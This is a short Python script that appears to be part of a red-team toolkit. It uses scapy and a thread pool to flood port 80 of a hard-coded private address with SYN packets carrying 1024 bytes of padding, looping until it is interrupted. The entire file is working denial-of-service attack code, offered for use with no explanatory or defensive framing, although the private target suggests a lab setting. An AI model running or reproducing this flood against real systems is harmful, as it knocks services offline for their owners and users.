from scapy.all import *
from red.config import config

import threading
import time
from multiprocessing.pool import ThreadPool

from loguru import logger

from red.config import config

TARGET_IP = "10.1.5.2"
stop = threading.Event()

def attack(_: None):
    while not stop.is_set():
        try:
            ip = IP(src=config.attack.ip, dst=TARGET_IP)
            tcp = TCP(sport=RandShort(), dport=80, flags="S")
            raw = Raw(b"X"*1024)
            packet = ip/tcp/raw
            send(packet)
        except TimeoutError:
            logger.info("Got a timeout :tada:!")

def run():#SOURCE_IP = "10.1.5.3", count=100):
    print("Sending packets...")
    threads = int(config.attack.cli.pps)
    logger.info(f"Starting with: "
                # f"{pps} "
                # f"{bps} "
                f"{threads} ")

    with ThreadPool(threads) as pool:
        pool.map(attack, [None] * threads)
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            stop.set()